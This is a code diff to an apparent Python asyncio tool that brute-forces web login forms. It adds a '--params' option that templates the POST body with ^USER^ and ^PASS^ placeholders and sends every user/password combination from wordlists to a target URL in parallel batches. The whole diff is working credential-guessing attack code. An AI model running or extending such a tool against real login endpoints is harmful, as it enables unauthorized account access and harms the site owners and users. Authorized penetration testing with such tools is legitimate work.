@@ -30,16 +30,18 @@ def coroutine(f):
 @click.option("-p", "password", type=str, help="Single known password")
 @click.option("-U", "user_list", type=Path, help="List of users to try")
 @click.option("-P", "password_list", type=Path, help="List of passwords to try")
+@click.option("--params", type=str, help="Request string like 'USER=userkey&PASS=passkey&ANYTHING=anything")
 @click.option("-b", "batch_size", type=int, help="Number of parallel requests")
 @click.option("-t", "threads", type=int, default=8)
 @coroutine
-async def crack(url:str, user:str, password:str, user_list:Path, password_list:Path, batch_size:int, threads:int):
+async def crack(url:str, user:str, password:str, user_list:Path, password_list:Path, params:str, batch_size:int, threads:int):
     _check_inputs(url, user, password, user_list, password_list)
+    request_data = RequestData(params)
     users = user_list.read_text("latin-1").splitlines() if user_list else [user]
     passwords = password_list.read_text("latin-1").splitlines() if password_list else [password]
     myconn = aiohttp.TCPConnector(limit=10)
     async with ClientSession(connector=myconn) as session:
-        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(users, passwords)), batch_size):
+        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(users, passwords, request_data)), batch_size):
             results = await asyncio.gather(*batch, return_exceptions=True)
             for result in results:
                 if isinstance(result, Exception):
@@ -54,6 +56,30 @@ def _check_inputs(url, user, password, user_list, password_list):
     if not "http" in url:
         raise ValueError("Your url must specify an http ressource")
 
+class RequestData:
+    def __init__(self, parameters:str):
+        self.data = self._parse_request_data(parameters)
+
+    @staticmethod
+    def _parse_request_data(parameters:str):
+        data = {}
+        for parameter in parameters.split("&"):
+            key, value = parameter.split("=")
+            data[key] = value
+        return data
+
+    def format(self, user, password):
+        formatted_data = {}
+        for key, value in self.data.items():
+            if value == "^USER^":
+                formatted_data[key] = user
+            elif value == "^PASS^":
+                formatted_data[key] = password
+            else:
+                formatted_data[key] = value
+        return formatted_data
+
+
 async def batched_tasks(genexpr:Generator, batch_size):
     batch = []
     while True:
@@ -67,10 +93,10 @@ async def batched_tasks(genexpr:Generator, batch_size):
         batch = []
     
 
-def permutations(users, passwords):
+def permutations(users, passwords, request_data):
     for user in users:
         for password in passwords:
-            yield {"j_username":user,"j_password": password, "Submit":"Sign+in"}
+            yield request_data.format(user, password)
            
 
 async def post_and_check(url, data, session:ClientSession) -> bool:
